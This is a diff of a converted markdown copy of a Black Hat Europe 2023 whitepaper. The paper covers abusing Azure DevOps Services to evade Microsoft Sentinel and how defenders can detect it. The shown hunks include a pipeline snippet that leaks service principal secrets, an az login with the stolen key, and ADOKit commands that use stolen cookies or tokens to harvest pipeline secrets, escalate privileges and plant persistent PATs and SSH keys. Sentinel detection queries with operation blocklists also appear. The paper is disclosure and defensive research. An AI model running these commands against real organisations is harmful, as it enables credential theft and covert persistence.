@@ -8,19 +8,24 @@ year: 2023
 source_pdf: "Black Hat Europe 2023 slides/Brett Hawkins_Hiding in the Clouds Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules_wp.pdf"
 pages: 112
 sha256: "2171e50a08c32630b5d4ec603dbb1e01280916dda4cb9cda54e54014e13242e5"
-text_chars: 106227
+text_chars: 106287
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-11T23:57:46Z"
+converted_at: "2026-08-12T04:01:24Z"
 ---
 # Hiding in the Clouds Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules
 
 **Speakers:** Brett Hawkins  
 **Conference:** Black Hat Europe 2023  
 **Source:** `Black Hat Europe 2023 slides/Brett Hawkins_Hiding in the Clouds Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules_wp.pdf` (112 pages)
+
 
 ## Slide 1
 
@@ -526,9 +531,9 @@ _Searching for file_
 
 You can also chain together different search terms using the “OR” directive. An example query is shown below for searching multiple files.
 
-```
+\```
 file:Test* OR file:azure-pipelines*
-```
+\```
 
 IBM X-Force Red | November 6, 2023
 
@@ -1128,10 +1133,10 @@ IBM X-Force Red | November 6, 2023
 
 ## Slide 60
 
-```
+\```
 'print(reversedSPNID)' >> blah.py;echo 'print(reversedSPNKEY)' >> blah.py;
 python blah.py $servicePrincipalId $servicePrincipalKey
-```
+\```
 
 If this is the first time the pipeline has used this service connection, it will require approval for its use.
 
@@ -1159,9 +1164,9 @@ _Job output printing SPN ID and key_
 
 You can then take the service principal ID, key, and tenant ID to authenticate to the Azure tenant and utilize the permissions of that account.
 
-```
+\```
 az login --service-principal -u spnID -p spnKey --tenant tenantID
-```
+\```
 
 ## DEFENSE EVASION
 
@@ -1642,19 +1647,19 @@ This rule can be configured to monitor for any additions to the Project Administ
 
 `| where Area == "Group" and OperationName ==` **"Group.UpdateGroupMembership.Add" | where Details has 'Administrators' | where Details has "was added as a member of group" and (Details endswith '\\Project Administrators' or Details endswith '\\Project Collection Administrators')**
 
-```
+\```
 | parse Details with AddedIdentity ' was added as a member of group ['
 EntityName ']\\' GroupName
-```
+\```
 
-```
+\```
 | extend Level = iif(GroupName == 'Project Collection Administrators',
 'Organization', 'Project'), AddedIdentityId = Data.MemberId
 | extend Severity = iif(Level == 'Organization', 'High', 'Medium'),
 AlertDetails = strcat('At ', TimeGenerated, ' UTC ', ActorUPN, '/',
 ActorDisplayName, ' added ', AddedIdentity, ' to the ', EntityName, ' ',
 Level)
-```
+\```
 
 `|` **where MonitorAllProjects == true or EntityName in (ProjectsToMonitor) or Level == 'Organization'** `| project TimeGenerated, Severity, Adder = ActorUPN, AddedIdentity, AddedIdentityId, AlertDetails, Level, EntityName, GroupName, ActorAuthType = AuthenticationMechanism, ActorIpAddress = IpAddress, ActorUserAgent = UserAgent, RawDetails = Details | extend timestamp = TimeGenerated, AccountCustomEntity = Adder, IPCustomEntity = ActorIpAddress`
 
@@ -1678,7 +1683,7 @@ Some audit events that are available do not trigger for all use cases. For examp
 
 The modifications highlighted in **blue** below will improve this rule using the REST API to perform sensitive operations through the authentication mechanism of not only PAT’s but also stolen authentication cookies. Additionally, this rule should be renamed to “Azure DevOps REST API misuse” since it is not only looking for PAT usage. It is recommended to test this rule out in your environment and perform tuning as needed to reduce false positives.
 
-```
+\```
 // Allowlisted UPNs should likely stay empty
 let AllowlistedUpns = datatable(UPN:string)['foo@bar.com', 'test@foo.com'];
 // Operation Name parts that will alert
@@ -1691,7 +1696,7 @@ datatable(OperationName:string)['Group.UpdateGroupMembership.Add','Library.Ser
 viceConnectionExecuted','Pipelines.PipelineModified',
 'Release.ReleasePipelineModified', 'Git.RefUpdatePoliciesBypassed'];
 AzureDevOpsAuditing
-```
+\```
 
 IBM X-Force Red | November 6, 2023
 
@@ -1723,7 +1728,7 @@ IBM X-Force Red | November 6, 2023
 
 The below rule logic can be applied to a new scheduled query analytic rule to detect the creation of PAT’s or SSH keys to be used as persistence, as shown in the techniques in this whitepaper. This rule will look for the creation of an SSH key or PAT. As a reminder, a PAT cannot be used to create another PAT or an SSH key via the REST API, therefore you will not see `Authentication Mechanism startswith “PAT”` in the rule. It is recommended to test this rule out in your environment and perform tuning as needed to reduce false positives.
 
-```
+\```
 // Allowlisted UPNs should likely stay empty
 let AllowlistedUpns = datatable(UPN:string)['foo@bar.com', 'test@foo.com'];
 // Distinct Operation Names that will flag
@@ -1731,7 +1736,7 @@ let HasExactBlocklist =
 datatable(OperationName:string)['Token.SshCreateEvent','Token.PatCreateEvent']
 ;
 AzureDevOpsAuditing
-```
+\```
 
 IBM X-Force Red | November 6, 2023
 
@@ -1739,7 +1744,7 @@ IBM X-Force Red | November 6, 2023
 
 ## Slide 90
 
-```
+\```
 | where (AuthenticationMechanism startswith "S2S_ServicePrincipal" or
 AuthenticationMechanism startswith "UserAuthToken") and (OperationName in
 (HasExactBlocklist))
@@ -1748,7 +1753,7 @@ AuthenticationMechanism startswith "UserAuthToken") and (OperationName in
 IpAddress, UserAgent, OperationName, Details, Data
 | extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN,
 IPCustomEntity = IpAddress
-```
+\```
 
 ### _Personal Access Tokens_
 
@@ -1794,10 +1799,10 @@ Below are some of the useful reconnaissance modules available within ADOKit. The
 
 After you have compromised a user authentication cookie or PAT, you will want to see what types of group memberships your compromised user has. By running the `whoami` module, this will give you the user you are authenticating as, along with any project or collection group membership the user has.
 
-```
+\```
 ADOKit.exe whoami /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization
-```
+\```
 
 > 53 https://github.com/xforcered
 
@@ -1809,10 +1814,10 @@ IBM X-Force Red | November 6, 2023
 
 ## Slide 93
 
-```
+\```
 ADOKit.exe whoami /credential:patToken
 /url:https://dev.azure.com/YourOrganization
-```
+\```
 
 _Module output for whoami_
 
@@ -1820,15 +1825,15 @@ _Module output for whoami_
 
 One common area of reconnaissance is to search for any code containing credentials. You can perform this using the `searchcode` module.
 
-```
+\```
 ADOKit.exe searchcode /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization /search:”search term”
-```
+\```
 
-```
+\```
 ADOKit.exe searchcode /credential:patToken /url:https://dev.azure.com/
 YourOrganization /search:”search term”
-```
+\```
 
 _Module output for searchcode_
 
@@ -1842,15 +1847,15 @@ IBM X-Force Red | November 6, 2023
 
 ## Slide 94
 
-```
+\```
 ADOKit.exe getgroupmembers /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization /group:”search term”
-```
+\```
 
-```
+\```
 ADOKit.exe getgroupmembers /credential:patToken /url:https://dev.azure.com/
 YourOrganization /group:”search term”
-```
+\```
 
 _Module output for getgroupmembers_
 
@@ -1858,15 +1863,15 @@ _Module output for getgroupmembers_
 
 If there is an interesting project that is being targeted, it is useful to know which users have authorization to that project, and what their access level is. This can be identified using the `getpermissions` module.
 
-```
+\```
 ADOKit.exe getpermissions /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization /project:”project name”
-```
+\```
 
-```
+\```
 ADOKit.exe getpermissions /credential:patToken /url:https://dev.azure.com/
 YourOrganization /project:”project name”
-```
+\```
 
 IBM X-Force Red | November 6, 2023
 
@@ -1902,10 +1907,10 @@ If you have compromised a user cookie or PAT and would like to add a non-privile
 
 An example is shown below adding a user to the Project Collection Build Administrators group using the `addcollectionbuildadmin` module
 
-```
+\```
 ADOKit.exe addcollectionbuildadmin /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization /user:”username”
-```
+\```
 
 IBM X-Force Red | November 6, 2023
 
@@ -1913,10 +1918,10 @@ IBM X-Force Red | November 6, 2023
 
 ## Slide 96
 
-```
+\```
 ADOKit.exe addcollectionbuildadmin /credential:patToken
 /url:https://dev.azure.com/YourOrganization /user:”username”
-```
+\```
 
 _Module output for addcollectionbuildadmin_
 
@@ -1924,24 +1929,24 @@ _Module output for addcollectionbuildadmin_
 
 The ability to obtain build pipeline variables and secret names can be useful for an attacker looking to perform privilege escalation and lateral movement throughout an organization. You can obtain build pipeline variables via the `getpipelinevars` module.
 
-```
+\```
 ADOKit.exe getpipelinevars /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization /project:”project name”
-```
+\```
 
-```
+\```
 ADOKit.exe getpipelinevars /credential:patToken /url:https://dev.azure.com/
 YourOrganization /project:”project name”
-```
+\```
 
 _Module output for getpipelinevars_
 
 Additionally, if a project is using a secret variable, you can get the name of the secret variable using the `getpipelinesecrets` module. This helps for additional targeting to perform the steps shown in the Retrieve Azure DevOps Services Build Variables and <u>Secrets</u> section to extract the contents of the secret variables.
 
-```
+\```
 ADOKit.exe getpipelinesecrets /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization /project:”project name”
-```
+\```
 
 IBM X-Force Red | November 6, 2023
 
@@ -1949,10 +1954,10 @@ IBM X-Force Red | November 6, 2023
 
 ## Slide 97
 
-```
+\```
 ADOKit.exe getpipelinesecrets /credential:patToken /url:https://dev.azure.com/
 YourOrganization /project:”project name”
-```
+\```
 
 _Module output for getpipelinesecrets_
 
@@ -1960,15 +1965,15 @@ _Module output for getpipelinesecrets_
 
 Service Connections are another component of Azure DevOps Services where credential extraction can be performed. To identify projects that have service connections, along with their service connection information, you can run the `getserviceconnections` module. Then you can perform the steps shown in the <u>Retrieve Service Connection Credentials section to extract the service connection</u> credentials.
 
-```
+\```
 ADOKit.exe getserviceconnections /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization /project:”project name”
-```
+\```
 
-```
+\```
 ADOKit.exe getserviceconnections /credential:patToken
 /url:https://dev.azure.com/YourOrganization /project:”project name”
-```
+\```
 
 _Module output for getserviceconnections_
 
@@ -1986,10 +1991,10 @@ IBM X-Force Red | November 6, 2023
 
 You can create a PAT to be used for persistence using the `createpat` module. Authentication via a cookie is required for this module because PATs cannot be used to create other PATs.
 
-```
+\```
 ADOKit.exe createpat /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization
-```
+\```
 
 _Snippet of output for createpat module_
 
@@ -1997,10 +2002,10 @@ _Snippet of output for createpat module_
 
 You can create an SSH key to be used for persistence using the `createsshkey` module. Authentication via a cookie is required for this module because PATs cannot be used to create SSH keys.
 
-```
+\```
 ADOKit.exe createsshkey /credential:UserAuthentication=ABC123
 /url:https://dev.azure.com/YourOrganization /sshkey:”ssh pub key”
-```
+\```
 
 _Snippet of output for createsshkey module_
 
@@ -2018,19 +2023,19 @@ There are multiple static signatures that can be used to detect the usage of ADO
 
 A static user agent string is used when attempting each module in ADOKit. The user agent string is `ADOKit-21e233d4334f9703d1a3a42b6e2efd38` . A snort<sup>56</sup> rule is provided in the ADOKit repository. Microsoft Sentinel analytic rule logic is provided below that can be applied in a Microsoft Sentinel scheduled query analytic rule to detect the usage of this tool for any auditable events.
 
-```
+\```
 AzureDevOpsAuditing
-```
+\```
 
-```
+\```
 // Look for the user agent for ADOKit
-```
+\```
 
-```
+\```
 | where UserAgent has_any ("ADOKit-21e233d4334f9703d1a3a42b6e2efd38")
 | extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN,
 IPCustomEntity = IpAddress
-```
+\```
 
 In this example, we used ADOKit to add a user to the Project Collection Administrators group, which caused our alert to trigger.
 
@@ -2052,7 +2057,7 @@ _Event details for ADOKit usage alert_
 
 Additionally, any PAT’s or SSH keys that are created using ADOKit will be prepended with `ADOKit-` in the name. This can be filtered within Azure DevOps Services to indicate a PAT or SSH key was created using ADOKit. Microsoft Sentinel analytic rule logic is provided below that can be applied in a Microsoft Sentinel scheduled query analytic rule to detect the usage of ADOKit to add persistence via a created PAT or SSH key.
 
-```
+\```
 // Allowlisted UPNs should likely stay empty
 let AllowlistedUpns = datatable(UPN:string)['foo@bar.com', 'test@foo.com'];
 // Distinct Operation Names that will flag
@@ -2069,7 +2074,7 @@ AuthenticationMechanism startswith "UserAuthToken") and UserAgent has_any
 IpAddress, UserAgent, OperationName, Details, Data
 | extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN,
 IPCustomEntity = IpAddress
-```
+\```
 
 In this example, we used ADOKit to create a PAT, which caused our alert to trigger.
 
